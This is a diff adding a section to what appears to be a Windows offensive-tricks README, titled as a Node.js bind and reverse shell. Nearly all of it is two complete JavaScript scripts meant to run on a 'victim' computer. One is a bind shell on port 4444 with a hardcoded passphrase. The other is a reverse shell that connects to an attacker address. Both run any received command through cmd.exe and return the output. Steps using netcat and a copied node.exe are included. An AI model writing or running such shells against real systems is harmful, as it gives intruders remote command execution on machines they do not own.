@@ -627,3 +627,107 @@ Double-click on the modified copy of cmd.exe.<br />
 
 You now have a command shell.<br />
 ![alt text](https://github.com/billchaison/Windows-Trix/blob/master/cmd10.png)
+
+## >> Node.js bind and reverse shell using node.exe
+
+The Node.js JavaScript runtime is occasionally found on a Windows system either as a standalone installation or bundled in with some other application (e.g. Adobe Creative Cloud).  You can also extract the node.exe binary from the [ZIP package](https://nodejs.org/en/download/ "Node.js Download") and copy it to a victim computer.
+
+Example of a bind shell (socket server)<br />
+```javascript
+// Example command execution server with authentication.
+// (1) Save this script as "server.js"
+// (2) Launch the bind shell on the victim "node.exe server.js"
+// (3) Connect from the attacking computer "nc <victim IP> 4444"
+// command: ug0tpwn3d, allows the server to start processing commands.
+// command: DISCONNECT, drops current connection, must reauth with key on new client connect.
+// command: ABORT, terminates the script.
+
+var net = require('net');
+var spawn = require('child_process').spawn;
+var c2host = '0.0.0.0';
+var c2port = 4444;
+var state = 'DISABLED';
+var authkey = 'ug0tpwn3d';
+
+var server = net.createServer(function(socket)
+{
+   socket.write('Ready...\r\n');
+   socket.on('data', function(directive)
+   {
+      if(directive.toString().trim() === authkey && state === 'DISABLED')
+      {
+         // authn success, start processing commands
+         state = 'ENABLED';
+         socket.write('Authentication successful.  Accepting commands...\r\n');
+      }
+      else if(directive.toString().trim() === 'DISCONNECT' && state === 'ENABLED')
+      {
+         // drop current connection and disable command processor
+         socket.destroy();
+         state = 'DISABLED';
+      }
+      else if(directive.toString().trim() === 'ABORT' && state === 'ENABLED')
+      {
+         // terminate the script
+         socket.destroy();
+         process.exit(1);
+      }
+      else if(state === 'ENABLED')
+      {
+         // execute a command
+         cmd = spawn(process.env.comspec, ['/c', directive.toString().trim()], {windowsVerbatimArguments: true});
+         cmd.stdout.on('data', function(output)
+         {
+            socket.write(output.toString());
+         });
+         cmd.stderr.on('data', function(output)
+         {
+            socket.write(output.toString());
+         });
+      }
+   });
+}).listen(c2port, c2host);
+```
+
+Example of a reverse shell (socket client)<br />
+```javascript
+// Example command execution client.
+// (1) Save this script as "client.js"
+// (2) Start a netcat listener on the attacking computer "nc -nlvp 4444"
+// (3) Launch the reverse shell on the victim "node.exe client.js"
+// command: ABORT, terminates the script.
+
+var net = require('net');
+var spawn = require('child_process').spawn;
+var c2host = '192.168.1.119';
+var c2port = 4444;
+
+var client = new net.Socket();
+client.connect(c2port, c2host, function()
+{
+   client.write('Ready...\r\n');
+});
+client.on('data', function(directive)
+{
+   if(directive.toString().trim() === 'ABORT')
+   {
+      // terminate the script
+      client.destroy();
+      process.exit(1);
+   }
+   else
+   {
+      // execute a command
+      cmd = spawn(process.env.comspec, ['/c', directive.toString().trim()], {windowsVerbatimArguments: true});
+      cmd.stdout.on('data', function(output)
+      {
+         client.write(output.toString());
+      });
+      cmd.stderr.on('data', function(output)
+      {
+         client.write(output.toString());
+      });
+   }
+});
+```
+
